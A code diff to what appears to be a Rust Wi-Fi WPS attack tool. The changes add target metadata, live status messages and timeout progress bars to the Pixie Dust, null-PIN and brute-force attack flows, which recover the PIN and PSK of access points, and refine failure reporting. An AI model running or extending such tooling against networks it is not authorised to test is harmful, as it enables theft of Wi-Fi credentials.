@@ -324,6 +324,11 @@ pub struct WpsInfo {
     pub bssid: MacAddress,
     pub ssid: String,
     pub channel: u8,
+    pub rssi: i8,
+    pub vendor: String,
+    pub wifi_gen: String,
+    pub wps_version: u8,
+    pub wps_device_name: String,
 
     // === Multi-target progress ===
     pub target_index: u32,
@@ -346,6 +351,13 @@ pub struct WpsInfo {
 
     // === Sub-attack tracking (for live active zone rendering) ===
     pub sub_attacks: Vec<SubAttackInfo>,
+
+    // === Live activity detail (what we're doing right now) ===
+    pub detail: String,
+    /// When the current wait started (for timeout progress bar).
+    pub wait_started: Instant,
+    /// Total timeout duration for the current wait (None = no progress bar).
+    pub wait_timeout: Option<Duration>,
 
     // === Results ===
     pub pin_found: Option<String>,
@@ -414,6 +426,11 @@ impl Default for WpsInfo {
             bssid: MacAddress::ZERO,
             ssid: String::new(),
             channel: 0,
+            rssi: 0,
+            vendor: String::new(),
+            wifi_gen: String::new(),
+            wps_version: 0,
+            wps_device_name: String::new(),
             target_index: 0,
             target_total: 0,
             current_pin: String::new(),
@@ -428,6 +445,9 @@ impl Default for WpsInfo {
             ap_serial_number: String::new(),
             ap_device_name: String::new(),
             sub_attacks: Vec::new(),
+            detail: String::new(),
+            wait_started: Instant::now(),
+            wait_timeout: None,
             pin_found: None,
             psk_found: None,
             has_pixie_data: false,
@@ -1078,6 +1098,18 @@ fn run_wps_multi(
             i.bssid = target.bssid;
             i.ssid = target.ssid.clone();
             i.channel = target.channel;
+            i.rssi = target.rssi;
+            i.vendor = target.vendor.clone();
+            i.wifi_gen = match target.wifi_gen {
+                crate::protocol::ieee80211::WifiGeneration::Legacy => "Legacy".to_string(),
+                crate::protocol::ieee80211::WifiGeneration::Wifi4 => "WiFi4".to_string(),
+                crate::protocol::ieee80211::WifiGeneration::Wifi5 => "WiFi5".to_string(),
+                crate::protocol::ieee80211::WifiGeneration::Wifi6 => "WiFi6".to_string(),
+                crate::protocol::ieee80211::WifiGeneration::Wifi6e => "WiFi6E".to_string(),
+                crate::protocol::ieee80211::WifiGeneration::Wifi7 => "WiFi7".to_string(),
+            };
+            i.wps_version = target.wps_version;
+            i.wps_device_name = target.wps_device_name.clone();
             i.status = WpsStatus::InProgress;
             i.current_pin = String::new();
             i.attempts = 0;
@@ -1222,6 +1254,7 @@ fn run_wps_attack_single(
     // For multi-exchange modes (ComputedPin, Auto, BruteForce), use fast 32-byte keys.
     // For single-exchange modes (PixieDust, NullPin), use full 192-byte keys.
     set_phase(info, WpsPhase::KeyGeneration);
+    set_detail(info, "Generating 1536-bit DH keypair (modular exponentiation)...");
     let keygen_start = Instant::now();
 
     let use_fast_dh = matches!(params.attack_type,
@@ -1333,7 +1366,9 @@ fn run_wps_attack_single(
                     if i.pin_found.is_some() { "found".to_string() }
                     else { "no candidates".to_string() }
                 };
-                finish_sub(info, WpsStatus::PinWrong, &detail, sub_elapsed);
+                // Use real status — might be AuthFailed, not just PinWrong
+                let sub_status = if detail == "no candidates" { WpsStatus::PinWrong } else { cur_status };
+                finish_sub(info, sub_status, &detail, sub_elapsed);
             }
 
             // 2. Pixie Dust
@@ -1378,9 +1413,10 @@ fn run_wps_attack_single(
                     let phase = info.lock().unwrap_or_else(|e| e.into_inner()).phase;
                     let detail = match phase {
                         WpsPhase::Done => "rejected".to_string(),
-                        _ => format!("failed at {}", phase.short_label()),
+                        _ => format!("timeout at {}", phase.short_label()),
                     };
-                    finish_sub(info, WpsStatus::PinWrong, &detail, sub_elapsed);
+                    // Use the real status from the exchange, not a generic PinWrong
+                    finish_sub(info, cur_status, &detail, sub_elapsed);
                 }
             }
         }
@@ -1430,6 +1466,7 @@ fn run_pixie_dust(
 
             // Offline crack
             set_phase(info, WpsPhase::PixieCracking);
+            set_detail(info, "Running Pixie Dust offline crack (testing PRNG modes)...");
             push_event(events, start, WpsEventKind::PixieCrackStarted);
 
             let crack_start = Instant::now();
@@ -1508,9 +1545,9 @@ fn run_null_pin(
         }
         _ => {
             push_event(events, start, WpsEventKind::NullPinFailed);
-            // Don't overwrite PixieDataOnly status — preserve that info
+            // Don't overwrite specific failure statuses set by wps_single_exchange
             let current = info.lock().unwrap_or_else(|e| e.into_inner()).status;
-            if !matches!(current, WpsStatus::PixieDataOnly) {
+            if matches!(current, WpsStatus::InProgress) {
                 set_status(info, WpsStatus::PinWrong);
             }
         }
@@ -1805,7 +1842,11 @@ fn wps_single_exchange(
     for attempt in 0..=params.auth_retries {
         if !running.load(Ordering::SeqCst) { return ExchangeResult::Stopped; }
         if attempt > 0 {
+            set_detail(info, &format!("AUTH retry {}/{} — waiting {}ms",
+                attempt + 1, params.auth_retries + 1, params.auth_retry_delay.as_millis()));
             thread::sleep(params.auth_retry_delay);
+        } else {
+            set_detail(info, "Sending Open System auth request...");
         }
 
         let auth_frame = frames::build_auth(
@@ -1817,6 +1858,8 @@ fn wps_single_exchange(
         );
         let _ = shared.tx_frame(&auth_frame, tx_opts);
         inc_frames_sent(info);
+        set_detail_wait(info, &format!("Waiting for auth response (attempt {}/{})",
+            attempt + 1, params.auth_retries + 1), params.eap_timeout);
 
         if let Some(resp) = wait_for_mgmt(reader, &bssid, ieee80211::frame_subtype::AUTH,
                                            params.eap_timeout, running) {
@@ -1824,6 +1867,7 @@ fn wps_single_exchange(
             if let Some((_hdr, body)) = frames::parse_auth(&resp) {
                 if body.status == 0 && body.seq == 2 {
                     auth_ok = true;
+                    set_detail(info, "Auth response received — authenticated");
                     push_event(events, start, WpsEventKind::AuthSuccess { bssid });
                     break;
                 }
@@ -1832,17 +1876,22 @@ fn wps_single_exchange(
     }
 
     if !auth_ok {
+        set_detail(info, &format!("AUTH failed after {} attempts", params.auth_retries + 1));
         push_event(events, start, WpsEventKind::AuthFailed { bssid, attempt: params.auth_retries });
         return ExchangeResult::AuthFailed;
     }
 
     // ── Assoc with WPS IE ──
     set_phase(info, WpsPhase::Associating);
+    set_detail(info, "Sending association request with WPS IE...");
     let mut assoc_ok = false;
     let wps_ie = build_wps_assoc_ie();
     for attempt in 0..=params.assoc_retries {
         if !running.load(Ordering::SeqCst) { return ExchangeResult::Stopped; }
-        if attempt > 0 { thread::sleep(params.auth_retry_delay); }
+        if attempt > 0 {
+            set_detail(info, &format!("ASSOC retry {}/{}", attempt + 1, params.assoc_retries + 1));
+            thread::sleep(params.auth_retry_delay);
+        }
 
         let mut ies = Vec::with_capacity(256);
         let ssid_bytes = ssid.as_bytes();
@@ -1869,12 +1918,15 @@ fn wps_single_exchange(
             inc_frames_sent(info);
         }
 
+        set_detail_wait(info, &format!("Waiting for assoc response (attempt {}/{})",
+            attempt + 1, params.assoc_retries + 1), params.eap_timeout);
         if let Some(resp) = wait_for_mgmt(reader, &bssid, ieee80211::frame_subtype::ASSOC_RESP,
                                            params.eap_timeout, running) {
             inc_frames_received(info);
             if let Some((_hdr, body)) = frames::parse_assoc_response(&resp) {
                 if body.status == 0 {
                     assoc_ok = true;
+                    set_detail(info, "Associated with WPS IE");
                     push_event(events, start, WpsEventKind::AssocSuccess { bssid });
                     break;
                 }
@@ -1883,11 +1935,13 @@ fn wps_single_exchange(
     }
 
     if !assoc_ok {
+        set_detail(info, &format!("ASSOC failed after {} attempts", params.assoc_retries + 1));
         push_event(events, start, WpsEventKind::AssocFailed { bssid, attempt: params.assoc_retries });
         return ExchangeResult::AssocFailed;
     }
 
     // ── EAPOL-Start ──
+    set_detail(info, "Sending EAPOL-Start...");
     let eapol_start = build_eapol_start_frame(&bssid, &session.our_mac);
     let _ = shared.tx_frame(&eapol_start, tx_opts);
     inc_frames_sent(info);
@@ -1901,6 +1955,7 @@ fn wps_single_exchange(
     // ═══════════════════════════════════════════════════════════════════
 
     set_phase(info, WpsPhase::EapIdentity);
+    set_detail_wait(info, "Waiting for EAP Identity Request", params.eap_timeout);
     let mut id_response_sent = false;
     let mut _wsc_start_received = false;
     let mut m1_received = false;
@@ -1943,12 +1998,14 @@ fn wps_single_exchange(
                     // AP sent WSC_Start — it's ready for the exchange
                     _wsc_start_received = true;
                     set_phase(info, WpsPhase::WscStart);
+                    set_detail(info, "WSC_Start received — waiting for M1...");
                     push_event(events, start, WpsEventKind::WscStartReceived);
                     continue; // now wait for M1
                 }
                 opcode::WSC_MSG => {
                     // This should be M1 from the AP
                     set_phase(info, WpsPhase::M1Received);
+                    set_detail(info, "M1 received — parsing AP device info + public key...");
                     // Dump M1 TLVs for protocol debugging
                     {
                         use std::io::Write;
@@ -2022,6 +2079,7 @@ fn wps_single_exchange(
                 let _ = shared.tx_frame(&data_frame, tx_opts);
                 inc_frames_sent(info);
                 if !id_response_sent {
+                    set_detail(info, "Sending EAP Identity: WFA-SimpleConfig-Registrar-1-0");
                     push_event(events, start, WpsEventKind::EapIdentitySent);
                     id_response_sent = true;
                     set_phase(info, WpsPhase::WscStart);
@@ -2042,12 +2100,14 @@ fn wps_single_exchange(
 
     // ── Send M2 (registrar nonce, PKr) ──
     set_phase(info, WpsPhase::M2Sent);
+    set_detail(info, "Deriving AuthKey + KeyWrapKey from DH exchange...");
 
     // Derive keys: DH shared secret from PKe + our privkey
     let enrollee_mac = session.ap_device_info.mac_address.unwrap_or(*bssid.as_bytes());
     session.derive_keys(&enrollee_mac);
     if !session.has_keys { return ExchangeResult::M1Failed; }
     push_event(events, start, WpsEventKind::KeysDerived);
+    set_detail(info, "Keys derived — building M2 with registrar nonce + PKr...");
 
     let m2_body = match session.build_m2_body(params) {
         Some(b) => b,
@@ -2073,6 +2133,7 @@ fn wps_single_exchange(
     let _ = shared.tx_frame(&m2_frame, tx_opts);
     inc_frames_sent(info);
     push_event(events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M2 });
+    set_detail_wait(info, "M2 sent \u{2014} waiting for M3 (E-Hash1, E-Hash2)", params.eap_timeout);
 
     // ── Receive M3 from AP (E-Hash1, E-Hash2) ──
     // Drain stale frames from subscriber queue before waiting for M3.
@@ -2110,6 +2171,7 @@ fn wps_single_exchange(
 
     // ── Send M4 (R-Hash1, R-Hash2, encrypted R-S1) ──
     set_phase(info, WpsPhase::M4Sent);
+    set_detail(info, "M3 parsed — building M4 with R-Hash1, R-Hash2...");
     let m4_body = match session.build_m4_body() {
         Some(b) => b,
         None => return ExchangeResult::EapFailed,
@@ -2120,6 +2182,7 @@ fn wps_single_exchange(
     let _ = shared.tx_frame(&m4_frame, tx_opts);
     inc_frames_sent(info);
     push_event(events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M4 });
+    set_detail_wait(info, "M4 sent \u{2014} waiting for M5 (validates first PIN half)", params.eap_timeout);
 
     // ── Receive M5 from AP (encrypted E-S1 — first half correct!) ──
     // If NACK here: first PIN half is WRONG
@@ -2767,6 +2830,20 @@ fn set_phase(info: &Arc<Mutex<WpsInfo>>, phase: WpsPhase) {
 fn set_status(info: &Arc<Mutex<WpsInfo>>, status: WpsStatus) {
     let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
     i.status = status;
+}
+
+fn set_detail(info: &Arc<Mutex<WpsInfo>>, detail: &str) {
+    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
+    i.detail = detail.to_string();
+    i.wait_timeout = None;
+}
+
+/// Set detail with a timeout progress bar.
+fn set_detail_wait(info: &Arc<Mutex<WpsInfo>>, detail: &str, timeout: Duration) {
+    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
+    i.detail = detail.to_string();
+    i.wait_started = Instant::now();
+    i.wait_timeout = Some(timeout);
 }
 
 fn inc_frames_sent(info: &Arc<Mutex<WpsInfo>>) {
